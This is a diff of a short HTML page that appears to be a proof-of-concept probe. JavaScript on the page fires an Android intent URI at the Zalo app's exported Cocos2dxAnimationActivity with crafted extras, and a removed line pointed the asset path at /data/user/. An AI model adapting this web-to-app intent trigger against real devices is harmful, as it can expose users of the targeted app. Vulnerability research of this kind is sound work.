@@ -1,7 +1,29 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <h1>cocos.html</h1>  
-        <a style="font-size: 2.0em;" href="intent:#Intent;component=com.zing.zalo/com.zing.zalo.ui.Cocos2dxAnimationActivity;action=com.zing.zalo.intent.action.START_COCOS_EFFECT;S.extra_asset_path=/data/user/;S.extra_metadata_name=test;i.extra_effect_type=1;S.extra_play_params=t;B.extra_keyboard_showing=false;S.extra_input_text=a;i.extra_input_selection=1;end;">Cocos2dxAnimationActivity</a>
+        <h1>zalo.html</h1>
+        <a style='font-size: 2.0em;' href='javascript: go()'>Cocos2dxAnimationActivity</a>
     </body>
+
+    <script>
+        function go() {
+            let intent = '';
+            intent += 'intent:#Intent;';
+            intent += 'package=com.zing.zalo;';
+            intent += 'component=com.zing.zalo/com.zing.zalo.ui.Cocos2dxAnimationActivity;';
+            intent += 'action=com.zing.zalo.intent.action.START_COCOS_EFFECT;';
+            intent += 'S.extra_asset_path=x;';
+            intent += 'S.extra_metadata_name=x;';
+            intent += 'I.extra_effect_type=0;';
+            intent += 'S.extra_play_params=x;';
+            intent += 'B.extra_preview=false;';
+            intent += 'S.extra_effect_id=x;';
+            intent += 'B.extra_is_play_active=false;';
+            intent += 'B.extra_keyboard_showing=false;';
+            intent += 'S.extra_input_text=x;';
+            intent += 'I.extra_input_selection=0;';
+            intent += 'end;';
+            window.location.href = intent;
+        }
+    </script>
 </html>
